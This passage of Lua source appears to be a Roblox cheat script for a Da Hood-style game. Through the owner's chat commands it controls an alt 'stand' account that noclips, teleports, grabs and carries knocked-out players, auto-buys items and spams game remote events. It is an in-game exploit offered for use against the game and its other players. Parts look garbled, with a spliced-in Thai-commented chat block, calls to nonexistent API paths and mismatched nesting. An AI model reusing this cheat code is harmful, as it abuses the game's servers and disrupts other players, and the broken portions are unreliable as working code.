                getHumanoid(STAND).AutoRotate = false
            end
            if not getRoot(STAND):FindFirstChildWhichIsA("BodyGyro") then
                local bg = Instance.new("BodyGyro",getRoot(STAND))
                bg.maxTorque = Vector3.new(9e9,9e9,9e9)
                bg.P = 10000
            end
            getRoot(STAND).BodyGyro.CFrame = getRoot(TARGET).CFrame
            getRoot(STAND).BodyPosition.Position = getRoot(TARGET).CFrame*CFrame.new(X,Y,Z).Position
        else
            rs.Heartbeat:Wait()
            getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(X,Y,Z)
            STAND.Character:FindFirstChild('RightHand').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
            STAND.Character:FindFirstChild('LeftHand').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
            STAND.Character:FindFirstChild('RightFoot').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
            STAND.Character:FindFirstChild('LeftFoot').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
            STAND.Character:FindFirstChild('Head').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
        end
    end
    
    --[[function MoveTo(X,Y,Z)  
        getHumanoid(STAND):ChangeState(8)
        rs.Heartbeat:Wait()
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(X,Y,Z)
    end]]
    
    -- Poses :
    local function pose1()
        if Posing1 == true then
            rs:UnbindFromRenderStep("POSING")
            Posing1 = false
            Pose1:Stop(0.5)
        else
            Posing1 = true
            rs:BindToRenderStep("POSING",-1 ,function()
                pcall(function()
                    if Posing1 == true then
                        for i,v in pairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if (v.Animation.AnimationId:match("rbxassetid://3541114300")) or
                                (v.Animation.AnimationId:match("rbxassetid://3084858603")) or 
                                (v.Animation.AnimationId:match("rbxassetid://13850634687")) then
                                v:Stop();
                            end
                        end
                        if not Pose1.IsPlaying then          
                            Pose1:Play();
                            Pose1:AdjustSpeed(0);
                            Pose1.TimePosition = 0.42;
                        end
                    end
                end)
            end)
        end
    end
    
    local function pose2()
        if Posing2 == true then
            rs:UnbindFromRenderStep("POSING")
            Posing2 = false
            Pose2:Stop(0.5)
        else
            Posing2 = true
            rs:BindToRenderStep("POSING",-1 ,function()
                pcall(function()
                    if Posing2 == true then
                        if not Pose2.IsPlaying then
                            Pose2:Play();
                            Pose2:AdjustSpeed(0);
                            Pose2.TimePosition = 0.42;
                        end
                    end
                end)
            end)
        end
    end
    
    local function pose3()
        if Posing3 == true then
            rs:UnbindFromRenderStep("POSING")
            Posing3 = false
            Pose3:Stop(0.5)
        else
            Posing3 = true
            rs:BindToRenderStep("POSING",-1 ,function()
                pcall(function()
                    if Posing3 == true then
                        for i,v in pairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if (v.Animation.AnimationId:match("rbxassetid://3541114300")) or
                                (v.Animation.AnimationId:match("rbxassetid://3084858603")) or 
                                (v.Animation.AnimationId:match("rbxassetid://13850634687")) then
                                v:Stop();
                            end
                        end
                        if not Pose3.IsPlaying then
                            Pose3:Play();
                            Pose3:AdjustSpeed(0);
                            Pose3.TimePosition = 0.85;
                        end
                    end
                end)
            end)
        end
    end
    
    --BOOMBOX
    local OriginalKeyUpValue = 0
    function StopAudio()
        if STAND.Character.LowerTorso:FindFirstChild("BOOMBOXSOUND") then
            game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
        end
    end
    
    function STOPLMAO(ID,Key)
        local cor = coroutine.wrap(function()
            wait(STAND.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
            if STAND.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
                StopAudio()
            end
        end)
        cor()
    end
    
    function play(ID,STOP,TOOL)
        if STAND.Backpack:FindFirstChild("[Boombox]") then
            local Tool = nil
            if STAND.Character:FindFirstChildWhichIsA("Tool") and TOOL == true then
                Tool = STAND.Character:FindFirstChildWhichIsA("Tool")
                STAND.Character:FindFirstChildWhichIsA("Tool").Parent = STAND.Backpack
            end
            STAND.Backpack["[Boombox]"].Parent = STAND.Character
            game.ReplicatedStorage.MainEvent:FireServer("Boombox",ID)
            STAND.Character["[Boombox]"].Parent = STAND.Backpack
            STAND.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
            if Tool ~= true then
                if Tool then
                    Tool.Parent = STAND.Character
                end
            end
            if STOP == true then
                STAND.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
                local cor = coroutine.wrap(function()
                    repeat Wait() until STAND.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and STAND.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                    OriginalKeyUpValue = OriginalKeyUpValue+1
                    STOPLMAO(ID,OriginalKeyUpValue)
                end)
                cor()
            end
        end
    end
    
    function SummonAudio()
        if SummonMusic == true and StandMode == 'Star Platinum : OverHeaven' then
            play(5684695930,true,true)
        elseif SummonMusic == true and StandMode == "Star Platinum, Za Warudo!" then
            play(5736107502,true,true)
        elseif SummonMusic == true and StandMode == 'Star Platinum : The World' then
            play(2404992854,true,true)
        elseif SummonMusic == true and StandMode == "TheWorld" then
            play(5129686200,true,true)
        elseif SummonMusic == true and StandMode == 'C moon' then
            play(2404992854,true,true)
        elseif SummonMusic == true and StandMode == "Cmoon" then
            play(8258958078,true,true)
        elseif SummonMusic == true and StandMode == "King Crimson" then
            play(3373956700,true,true)
        elseif SummonMusic == true and StandMode == "MIH" then
            play(8713037614,true,true)
        elseif SummonMusic == true and StandMode == 'D4C' then
            play(8769131644,true,true)
        elseif SummonMusic == true and StandMode == 'Killer Queen' then
            play(5818138638,true,true)
        end
    end
    
    function Summon()
        Stop()
        follow = true
        noclip = true
        blocking = true
        game.Workspace.Camera.CameraSubject = getHumanoid(STAND)
        game.Workspace.FallenPartsDestroyHeight = -10000
        if FlyMode == 'Heaven' then
            HOVER:Play(0.28)
            HOVERV2:Play(0.28)
        else
            HOVER:Play(0.28)
        end
    end
    
    function SummonPose1()
        Stop()
        noclip = true
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,-100,0)
        rs.Stepped:Wait()
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0.4,-3,3)
        local BP = Instance.new("BodyPosition")
        BP.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
        BP.P = 2500
        BP.D = 275
        BP.Parent = getRoot(STAND)
        BP.Position = getRoot(STAND).Position
        rs:BindToRenderStep("Summon", -1 , function()
            BP.Position = getRoot(OWNER).CFrame*CFrame.new(1.4,1.85,1.7).Position
        end)
        pose1()
        wait(1.2)
        SummonAudio()
        pose1()
        rs:UnbindFromRenderStep("Summon")
        getRoot(STAND):FindFirstChildWhichIsA("BodyPosition"):Destroy()
        Summon()
    end
    
    function SummonPose2()
        Stop()
        noclip = true
        pose2(1)
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,-100,0)
        rs.Stepped:Wait()
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,-3,3)
        rs.Stepped:Wait()
        local BP = Instance.new("BodyPosition")
        BP.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
        BP.P = 300
        BP.D = 100
        BP.Parent = getRoot(STAND)
        BP.Position = getRoot(STAND).Position
        rs:BindToRenderStep("Summon", -1 , function()
            BP.Position = getRoot(OWNER).CFrame*CFrame.new(1.4,1,3).Position
        end)
        wait(1.2)
        SummonAudio()
        rs:UnbindFromRenderStep("Summon")
        getRoot(STAND):FindFirstChildWhichIsA("BodyPosition"):Destroy()
        pose2()
        Summon()
    end
    
    function SummonPose3()
        Stop()
        noclip = true
        pose3(1)
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,-100,0)
        rs.Stepped:Wait()
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,-3,1.65)
        rs.Stepped:Wait()
        local BP = Instance.new("BodyPosition")
        BP.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
        BP.P = 300
        BP.D = 100
        BP.Parent = getRoot(STAND)
        BP.Position = getRoot(STAND).Position
        rs:BindToRenderStep("Summon", -1 , function()
            BP.Position = getRoot(OWNER).CFrame*CFrame.new(0,2,3).Position
        end)
        wait(1)
        SummonAudio()
        rs:UnbindFromRenderStep("Summon")
        getRoot(STAND):FindFirstChildWhichIsA("BodyPosition"):Destroy()
        pose3()
        Summon()
    end
    
    function Barrage()
        --[[if Sounds == true and StandMode == 'Star Platinum : OverHeaven' then
            play(6181278583,false,true)
        elseif Sounds == true and StandMode == "Star Platinum,Za Warudo!" then
            play(6181278583,false,true)
        elseif Sounds == true and StandMode == 'Star Platinum: The World' then
            play(6181278583,false,true)
        elseif Sounds == true and StandMode == "TheWorld" then
            play(6889746326,false,true)
        end]]
        Stop()
        noclip = true
        barragepunch = true	
        barragepos = true
        repeat rs.Stepped:Wait()
            if STAND.Character:FindFirstChild('Combat') then
                STAND.Character:FindFirstChild('Combat'):Activate()
                STAND.Character:FindFirstChild('Combat'):Deactivate()
            else
                STAND.Backpack:FindFirstChild('Combat').Parent = STAND.Character
            end
            for i,v in pairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                if (v.Animation.AnimationId:match("rbxassetid://3541114300")) or
                    (v.Animation.AnimationId:match("rbxassetid://13850634687")) or 
                    (v.Animation.AnimationId:match("rbxassetid://13850660986")) or 
                    (v.Animation.AnimationId:match("rbxassetid://2788309317")) or 
                    (v.Animation.AnimationId:match("rbxassetid://2788308661")) or 
                    (v.Animation.AnimationId:match("rbxassetid://2788311138")) or 
                    (v.Animation.AnimationId:match("rbxassetid://2788309982")) then 
                    v:Stop();
                end
            end
    
            Barraging1:Play()
            Barraging2:Stop()
            Barraging3:Stop()
            Barraging4:Stop()	
            Barraging1:AdjustSpeed(8.15)
            wait(0.013)
            Barraging1:Stop()
            Barraging2:Play()
            Barraging3:Stop()
            Barraging4:Stop()	
            Barraging2:AdjustSpeed(8.15)
            wait(0.013)
            Barraging1:Stop()
            Barraging2:Stop()
            Barraging3:Play()
            Barraging4:Stop()
            Barraging3:AdjustSpeed(8.15)
            wait(0.013)
            Barraging1:Stop()
            Barraging2:Stop()
            Barraging3:Stop()
            Barraging4:Play()
            Barraging4:AdjustSpeed(8.15)
        until barragepunch == false
    end
    
    function Nobarrage()
        StopAudio()
        wait()
        if Sounds == true then
            play(6603004272,true,true)
        end
        Summon()
    end
    
    function Vanish()
        Stop()
        noclip = true
        MoveTo(-0.2,-10,1.4)
        wait(0.250)
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,-800,0)
        vanish = true
    end

    function Heal()
        Stop()
        noclip = true
        getHumanoid(STAND):UnequipTools()
        Buy('[Taco]','2','[Taco]')
        STAND.Backpack:FindFirstChild("[Taco]").Parent = STAND.Character
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,50,0)
        wait(.1)
        follow = true
        repeat rs.Stepped:Wait()
            STAND.Character:FindFirstChild('[Taco]'):Activate()
        until not STAND.Character:FindFirstChild('[Taco]')
    end
    
    function SAVEOWNER()
        Stop()
        noclip = true
        follow = false
        getHumanoid(STAND):UnequipTools()
        game.Workspace.Camera.CameraSubject = getHumanoid(STAND)
        repeat rs.Stepped:Wait()
            if KO(OWNER).Value == true then
                getRoot(STAND).CFrame=CFrame.new(getTorso(OWNER).Position)*CFrame.new(0,5,0)
                wait(.2)
                game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
                wait(.1)
                getRoot(STAND).CFrame = CFrame.new(-484,41,-100)
                wait(.4)
                game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
            end
    
            if KO(OWNER).Value == false or OWNER.Character:FindFirstChild('GRABBING_CONSTRAINT') then
                follow = true
            end
        until KO(OWNER).Value == false or OWNER.Character:FindFirstChild('GRABBING_CONSTRAINT')
    end
    
    function TP(cframe)
        if Alt == false then
            Stop()
            noclip = true
            if Sounds == true then
                play(8655611378,true,true) 
            end	
            if KO(OWNER).Value == false then
                game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
            if STAND.Backpack:FindFirstChild("Combat") then STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character end
            wait()
            repeat rs.Stepped:Wait()
                if KO(OWNER).Value == false then
                    game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                    getRoot(STAND).CFrame=CFrame.new(getRoot(OWNER).Position)*CFrame.new(0,0,0)
                end
            until KO(OWNER).Value == true
            repeat rs.Stepped:Wait()
                getRoot(STAND).CFrame = CFrame.new(getTorso(OWNER).Position)*CFrame.new(0,1000,0)
            until Attacking(STAND).Value == false
            
            repeat rs.Stepped:Wait()
                if KO(OWNER).Value == true then
                    circle = false
                    getRoot(STAND).CFrame=CFrame.new(getTorso(OWNER).Position)*CFrame.new(0,5,0)wait(.2)
                    game.ReplicatedStorage.MainEvent:FireServer("Grabbing") wait(.1)
                    getRoot(STAND).CFrame = cframe wait(.4)
                    game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
                end	
            until KO(OWNER).Value == false
            Summon()
            wait(2)
            game.ReplicatedStorage.MainEvent:FireServer("JoinCrew",CrewID) 
        else
            if KO(OWNER).Value == true then
                repeat rs.Stepped:Wait()
                    if KO(OWNER).Value == true then
                        circle = false
                        getRoot(STAND).CFrame=CFrame.new(getTorso(OWNER).Position)*CFrame.new(0,5,0) wait(.2)
                        game.ReplicatedStorage.MainEvent:FireServer("Grabbing") wait(.1)
                        getRoot(STAND).CFrame = cframe wait(.4)
                        game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
                    end
                    until KO(OWNER).Value == false
                    Summon()
                end
            end
        end
    end
    
    function TPGrabbed(cframe)
        if Sounds == true then
            play(8655611378,true,true) 
        end	
        Stop()
        noclip = true
        getRoot(STAND).CFrame = cframe
        wait(.5)
        game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
        wait(.5)
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,50,0)
        wait(.1)
        follow = true
    end	
    
    function FollowMode()
        if FlyMode == 'Fly' then
            HOVER:Play(0.28)
            function Moved()
                HOVER:Play(0.28)
                if OWNER.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0 and StopHoverAnim == false then
                    if FLY.IsPlaying == true then
                        return
                    end
                        HOVER:Stop(0.3)
                        FLY:Play(0.3)
                    else
                        FLY:Stop(0.28)
                        HOVER:Play(0.28)
                    end     
                end
                OWNER.Character:WaitForChild("Humanoid"):GetPropertyChangedSignal("MoveDirection"):Connect(Moved)
            else
                if FlyMode == 'Glide' then
                HOVER:Play(0.28)
                function Moved()
                if OWNER.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0 and StopHoverAnim == false then
                    if GLIDE.IsPlaying == true then
                        return
                    end
                        HOVER:Stop(0.28)
                        GLIDE:Play(0.28)
                    else
                        GLIDE:Stop(0.28)
                        HOVER:Play(0.28)
                    end     
                end
                OWNER.Character:WaitForChild("Humanoid"):GetPropertyChangedSignal("MoveDirection"):Connect(Moved)
            else
                if FlyMode == 'Heaven' then
                    HOVER:Play(0.28)
                    HOVERV2:Play(0.28)
                    function Moved()
                    if OWNER.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0 and StopHoverAnim == false then
                        if GLIDE.IsPlaying == true then
                            return
                        end
                            HOVER:Stop(0.3)
                            HOVERV2:Stop(0.3)
                            GLIDE:Play(0.3)
                        else
                            HOVER:Play(0.28)
                            HOVERV2:Play(0.28)
                            GLIDE:Stop(0.28)
                        end     
                    end
                    OWNER.Character:WaitForChild("Humanoid"):GetPropertyChangedSignal("MoveDirection"):Connect(Moved)	
                end
            end
        end
    end
    FollowMode()
    
    function MaskHide()
        if StopHoverAnim == false then
            if MaskMode == 'Skull' then
                STAND.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
                Buy("[Skull Mask]","64","[Mask]")
                STAND.Backpack:FindFirstChild("[Mask]").Parent = STAND.Character
                STAND.Character:FindFirstChild('[Mask]'):Activate()
                getHumanoid(STAND):UnequipTools()
            elseif MaskMode == 'Paintball' then
                STAND.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
                Buy("[Paintball Mask]","64","[Mask]")
                STAND.Backpack:FindFirstChild("[Mask]").Parent = STAND.Character
                STAND.Character:FindFirstChild('[Mask]'):Activate()
                getHumanoid(STAND):UnequipTools()
            elseif MaskMode == 'Pumpkin' then
                STAND.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
                Buy("[Pumpkin Mask]","64","[Mask]")
                STAND.Backpack:FindFirstChild("[Mask]").Parent = STAND.Character
                STAND.Character:FindFirstChild('[Mask]'):Activate()
                getHumanoid(STAND):UnequipTools()
            elseif MaskMode == 'Hockey' then
                STAND.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
                Buy("[Hockey Mask]","64","[Mask]")
                STAND.Backpack:FindFirstChild("[Mask]").Parent = STAND.Character
                STAND.Character:FindFirstChild('[Mask]'):Activate()
                getHumanoid(STAND):UnequipTools()
            elseif MaskMode == 'Ninja' then
                STAND.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
                Buy("[Ninja Mask]","64","[Mask]")
                STAND.Backpack:FindFirstChild("[Mask]").Parent = STAND.Character
                STAND.Character:FindFirstChild('[Mask]'):Activate()
                getHumanoid(STAND):UnequipTools()
            elseif MaskMode == 'Surgeon' then
                STAND.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
                Buy("[Surgeon Mask]","27","[Mask]")
                STAND.Backpack:FindFirstChild("[Mask]").Parent = STAND.Character
                STAND.Character:FindFirstChild('[Mask]'):Activate()
                getHumanoid(STAND):UnequipTools()
            elseif MaskMode == 'Riot' then
                STAND.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
                Buy("[Riot Mask]","64","[Mask]")
                STAND.Backpack:FindFirstChild("[Mask]").Parent = STAND.Character
                STAND.Character:FindFirstChild('[Mask]'):Activate()
                getHumanoid(STAND):UnequipTools()
            end
        end
    end	
    
    getRoot(STAND).CFrame=CFrame.new(-547.482239, 173.374954, -0.0784880966)
    
local TextChatService = game:GetService("TextChatService")

-- ฟังก์ชันดักข้อความที่วิ่งเข้ามา (แชทจากคนอื่นหรือระบบ)
TextChatService.OnIncomingMessage = function(message)
    print("Text:", message.Text)
end
local function Chat(msg)
    -- หาแชแนล "General" (ช่องแชทหลัก)
    local channel = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
    if channel then
        channel:SendAsync(msg) -- ส่งข้อความไปที่แชท
    end
end

    
    TARGET = nil
    Arg = ''
    function Create(command,callback)
    callback = callback or function() end
        game.ReplicatedStorage.TextChatService.OnIncomingMessage.OnMessageDoneFiltering.OnClientEvent:Connect(function(msg)
        if msg.Message:lower() == command:lower() and msg.FromSpeaker == tostring(OWNER.Name) then
                pcall(callback)
            end
        end)
    end
    
    function gplr(String)
        local strl = String:lower()
        for i,v in pairs(game:FindService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1,#String) == String:lower() or v.DisplayName:lower():sub(1,#String) == String:lower() then
                return v
            end
        end 
    end
    
    function CreateTargetAbility(command,callback)
        callback = callback or function() end
        game.ReplicatedStorage.TextChatService.OnIncomingMessageDoneFiltering.OnClientEvent:Connect(function(msg)
            if msg.FromSpeaker == tostring(OWNER.Name) then
                    local msgString = msg.Message:split(" ")
                    local cmdName = msg
                    
                    if msgString[1]:lower() == command:lower() then
                        
                        local args = {}
                
                        for i = 2,#msgString,1 do
                            table.insert(args,msgString[i])
                        end
    
                        if args[1] then
                            local GetPlayer = gplr(args[1])
                        if GetPlayer then
                            TARGET = GetPlayer
                            pcall(callback)
                        else
                            Chat("Invalid Target.")
                        end
                    end
                end
            end
        end)
    end
    
    function Arg(command,callback)
        callback = callback or function() end
        game.ReplicatedStorage.TextChatService.OnIncomingMessageDoneFiltering.OnClientEvent:Connect(function(msg)
            if msg.FromSpeaker == tostring(OWNER.Name) then
                    local msgString = msg.Message:split(" ")
                    local cmdName = msg
                    
                    if msgString[1]:lower() == command:lower() then
                        
                        local args = {}
                
                        for i = 2,#msgString,1 do
                            table.insert(args,msgString[i])
                        end
    
                        if args[1] then
                            local argument = args[1]
                        if argument then
                            Arg = argument
                            pcall(callback)
                        end
                    end
                end
            end
        end)
    end
    
    function Teleport(command)
        game.ReplicatedStorage.TextChatService.OnIncomingMessageDoneFiltering.OnClientEvent:Connect(function(msg)
            if msg.FromSpeaker == tostring(OWNER.Name) then
                local msgString = msg.Message:split(" ")
                local cmdName = msg
                
                if msgString[1]:lower() == command:lower() then
                    
                    local args = {}
            
                    for i = 2,#msgString,1 do
                        table.insert(args,msgString[i])
                    end
    
                    if args[1] == "bank" then
                        TP(CFrame.new(-445,39,-284))
                    elseif args[1] == "Roof" then
                        TP(CFrame.new(-328,80,-298))
                    elseif args[1] == "club" then
                        TP(CFrame.new(-264,-6.,-379))
                    elseif args[1] == "casino" then
                        TP(CFrame.new(-1001,80,-230))
                    elseif args[1] == "ufo" then
                        TP(CFrame.new(69,139,-688))
                    elseif args[1] == "mil" then
                        TP(CFrame.new(36,50,-832))
                    elseif args[1] == "school" then
                        TP(CFrame.new(-586,68,326))
                    elseif args[1] == "shop1" then
                        TP(CFrame.new(-335.141,23,-298))
                    elseif args[1] == "shop2" then
                        TP(CFrame.new(298,49,-615))
                    elseif args[1] == "rev" then
                        TP(CFrame.new(-638,21,-126))
                    elseif args[1] == "db" then
                        TP(CFrame.new(25,25,-834))
                    elseif args[1] == "pool" then
                        TP(CFrame.new(1-847,51,-300))
                    elseif args[1] == "armor" then
                        TP(CFrame.new(408,48,-43))
                    elseif args[1] == "subway" then
                        TP(CFrame.new(646,47,-68))
                    elseif args[1] == "subway1" then
                        TP(CFrame.new(-371,-21,113))
                    elseif args[1] == "sewer" then
                        TP(CFrame.new(172,-41,156))
                    elseif args[1] == "wheel" then
                        TP(CFrame.new(159,157,-722))
                    elseif args[1] == "safe1" then
                        TP(CFrame.new(0,15,213))
                    elseif args[1] == "safe2" then
                        TP(CFrame.new(-116,-58,146))
                    elseif args[1] == "safe3" then
                        TP(CFrame.new(-547,173,-0))
                    elseif args[1] == "safe4" then
                        TP(CFrame.new(-1100,110.,-90))
                    elseif args[1] == "Basketball" then
                        TP(CFrame.new(-908,21,-500))
                    elseif args[1] == "boxing" then
                        TP(CFrame.new(-234,22,-1119))
                    elseif args[1] == "bull" then
                        TP(CFrame.new(-660,23,-122))
                    else
                        local GetPlayer = gplr(args[1])
                        if GetPlayer then
                            TP(CFrame.new(getTorso(GetPlayer).Position)*CFrame.new(0,0,0))
                        else
                            Chat('Invalid Place.')
                        end
                    end
                end
            end
        end)
    end
    
    function Say(command)
        game.ReplicatedStorage.TextChatService.OnIncomingMessageDoneFiltering.OnClientEvent:Connect(function(msg)
            if msg.FromSpeaker == tostring(OWNER.Name) then
                local msgString = msg.Message:split(" ")
                local cmdName = msg
                
                if msgString[1]:lower() == command:lower() then
                    
                    local args = {}
            
                    for i = 2,#msgString,1 do
                        table.insert(args,msgString[i])
                    end
    
                    if args[1] then
                        Chat(''..args[1]..' '..args[2]..' '..args[3]..'')
                    end
                end
            end
        end)
    end
    
    Say('Say!')
    Teleport('tp!')
    Teleport('Goto!')
    Teleport('To!')
    Arg('Drop!',function()
        if Arg == "base" then
            TPGrabbed(CFrame.new(-797,-39,-886))
        elseif Arg == "bank" then
            TPGrabbed(CFrame.new(-445,39,-284))
        elseif Arg == "club" then
            TPGrabbed(CFrame.new(-264,-6.,-379))
        elseif Arg == "casino" then
            TPGrabbed(CFrame.new(-1001,80,-230))
        elseif Arg == "ufo" then
            TPGrabbed(CFrame.new(69,139,-688))
        elseif Arg == "mil" then
            TPGrabbed(CFrame.new(36,50,-832))
        elseif Arg == "school" then
            TPGrabbed(CFrame.new(-586,68,326))
        elseif Arg == "shop1" then
            TPGrabbed(CFrame.new(-335.141,23,-298))
        elseif Arg == "shop2" then
            TPGrabbed(CFrame.new(298,49,-615))
        elseif Arg == "rev" then
            TPGrabbed(CFrame.new(-638,21,-126))
        elseif Arg == "db" then
            TPGrabbed(CFrame.new(25,25,-834))
        elseif Arg == "pool" then
            TPGrabbed(CFrame.new(1-847,51,-300))
        elseif Arg == "armor" then
            TPGrabbed(CFrame.new(408,48,-43))
        elseif Arg == "subway" then
            TPGrabbed(CFrame.new(646,47,-68))
        elseif Arg == "subway1" then
            TPGrabbed(CFrame.new(-371,-21,113))
        elseif Arg == "sewer" then
            TPGrabbed(CFrame.new(172,-41,156))
        elseif Arg == "wheel" then
            TPGrabbed(CFrame.new(159,157,-722))
        elseif Arg == "safe1" then
            TPGrabbed(CFrame.new(-908,21,-500))
        elseif Arg == "safe2" then
            TPGrabbed(CFrame.new(-116,-58,146))
        elseif Arg == "safe3" then
            TPGrabbed(CFrame.new(-547,173.,-0))
        elseif Arg == "Basketball" then
            TPGrabbed(CFrame.new(-908,21,-500))
        elseif Arg == "boxing" then
            TPGrabbed(CFrame.new(-234,22,-1119))
        else
            local GetPlayer = gplr(Arg)
            if GetPlayer then
                TPGrabbed(CFrame.new(getTorso(GetPlayer).Position)*CFrame.new(0,0,0))
            else
                Chat('Invalid Place.')
            end
        end
    end)
    
    Arg('Prediction!',function()
        accomidationfactor = Arg
    end)
    
    Arg("Say!", function()
        Chat(""..Arg.."")
    end)
    
    Arg("Redeem!", function()
        game.ReplicatedStorage.MainEvent:FireServer("EnterPromoCode",Arg)
    end)
    
    Create("Drop!",function()
        if Sounds == true then
            play(8655611378,true,true) 
        end	
    
        if Pos == "Alt" then
            follow = false
            noclip = true
            getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,5,0) wait(1)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
            follow = true
        else
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
    
        end
    end)
    
    Create("Throw!",function()
        if Sounds == true then
            play(8655611378,true,true) 
        end	
    
        if Pos == "Alt" then
            follow = false
            noclip = true
            getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,5,0) wait(1)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",true)
            follow = true
        else
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",true)
    
        end
    end)
    
    Create("ShowSc!",function()
        rs:Set3dRenderingEnabled(true)
    end)
    
    Create("Hidesc!",function()
        rs:Set3dRenderingEnabled(false)
    end)
    
    Create('Rejoin!',function()
        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId,game.JobId,STAND)
    end)
    
    Create('Re!',function()
        game.ReplicatedStorage.MainEvent:FireServer("ResetNew")getHumanoid(STAND):ChangeState'Dead'
    end)
    
    Create('Refresh!',function()
        game:GetService("ReplicatedStorage").MainEvent:FireServer("Block",false)
    end)
    
    Create('s',function()
        SummonAudio()
        Summon()
    end)
    
    Create('77777777',function()
        SummonPose1()
    end)
    
    Create('77777777',function()
        SummonPose2()
    end)
    
    Create('77777777777',function()
        SummonPose3()
    end)
    --unmuteabe stuff
    OWNER.Chatted:Connect(function(msg)
        if msg:lower() == "babajeea" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "vibeaa" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "vibea1" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "motorcyle" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "meow" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "die" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "amongus" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "riz" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "..." then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "fire" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "scam" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "bom" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        elseif msg:lower() == "cri" then wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        end
    end)
    Create('aa',function()
        OWNER.Character.ChildAdded:Connect(function(a)
            if a.Name == '[Phone]' then
                wait(.1)
                game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
            end
        end)
    
    end)
    Create('a',function()
        game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
    end)
    
    OWNER.Chatted:Connect(function(msg)
        if msg == ('/e cm') then
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall",OWNER.Name)
        end
    end)
    OWNER.Chatted:Connect(function(msg)
        if msg == ('/e q') then
            SummonAudio()
            Summon()
        end
    end)
    
    OWNER.Chatted:Connect(function(msg)
        if msg == ('7777777777') then
            SummonPose1()
        end
    end)
    
    OWNER.Chatted:Connect(function(msg)
        if msg == ('77777777777') then
            SummonPose2()
        end
    end)
    
